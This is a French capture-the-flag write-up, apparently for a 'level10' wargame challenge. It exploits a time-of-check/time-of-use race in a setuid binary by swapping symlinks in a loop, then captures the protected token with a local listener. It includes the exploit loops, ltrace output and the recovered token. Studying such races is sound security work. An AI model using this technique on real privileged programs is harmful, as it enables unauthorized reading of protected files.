```shell
$>ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token

$>./level10
        sends file to host if you have access to it

$>./level10 token
./level10 file host
        sends file to host if you have access to it
```

le programme semble demander un fichier et l'envoi sur un host

```shell
$>./level10 token 127.0.0.1
You don't have access to token
```
mais on a pas d'accès à token. Essayons avec un fichier accessible:

```shell
$>echo 'coucou' > /tmp/token
$>./level10 /tmp/token 127.0.0.1
Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
```
créons un petit serveur en python (server.py) qui écoute sur le port 6969,
et qu'on execute dans un autre terminal
```shell
$>/tmp/server.py
starting up on 127.0.0.1 port 6969
waiting for a connection
```
puis sur le premier terminal 
```shell
./level10 /tmp/token 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
```

sur le second on a bien des infos provenant du programe ./level10
```shell
('connection from', ('127.0.0.1', 58417))
received ".*( )*."
received "coucou"
```
On remarquera que le programme semble envoyer '.(* *).' comme une sorte de 'header'.

Maintenant le soucis c'est qu'on ne peux pas acceder à token.

si on lance la dernière commance avec ltrace on a:
```shell
ltrace ./level10 /tmp/token 127.0.0.1
__libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/token", 4)                                     = 0
printf("Connecting to %s:6969 .. ", "127.0.0.1")            = 32
fflush(0xb7fd1a20Connecting to 127.0.0.1:6969 .. )                                          = 0
socket(2, 1, 0)                                             = 3
inet_addr("127.0.0.1")                                      = 0x0100007f
htons(6969, 1, 0, 0, 0)                                     = 14619
connect(3, 0xbffff70c, 16, 0, 0)                            = 0
write(3, ".*( )*.\n", 8)                                    = 8
printf("Connected!\nSending file .. "Connected!
)                      = 27
fflush(0xb7fd1a20Sending file .. )                                          = 0
open("/tmp/token", 0, 010)                                  = 4
read(4, "coucou\n", 4096)                                   = 7
write(3, "coucou\n", 7)                                     = 7
puts("wrote file!"wrote file!
)                                         = 12
+++ exited (status 12) +++
```
On remarque le programme fait appel à access... (pour verifier si les droits sont ok) puis plus loin à open, pour ouvrir vraiement.
C'est  une faille.

Il va faloir faire qu'au moment où le programme utilise *access* cela soit un fichier accessible ( un fake ) et quand il l'ouvre ce soit le vrai (token)
On va donc lancer ./level10 sur un fichier /tmp/token

Ce fichier sera, en alternance, un lien symbolique sur un fichier à nous (/tmp/fake) et le bon (~/token)

On crée le fichier fake:
```shell
echo '.*( )*.' > /tmp/fake
```
la boucle qui va alterner les liens symboliques :
```shell
(while true
    do
        ln -fs /tmp/fake /tmp/token;
        ln -fs ~/token /tmp/token;
    done)&
```
il nous faut une boucle qui va executer le programme :
```shell
(while true
    do
        ~/level10 /tmp/token 127.0.0.1 &> /dev/null
    done
    )&
```
on va aussi modifier un peut le server.py pour ne pas afficher le 'header'
On a dans les resources le fichier *server.py* et *script.sh* a mettre dans /tmp
puis a rendre executables. Ensuite on lance le *script.sh* et server.py
```shell
$>/tmp/script.sh
$>/tmp/server.py
starting up on 127.0.0.1 port 6969
received "woupa2yuojeeaaed06riuj63c"
received "woupa2yuojeeaaed06riuj63c"
...
^C
```
il nous reste à *su flag10* et *getflag*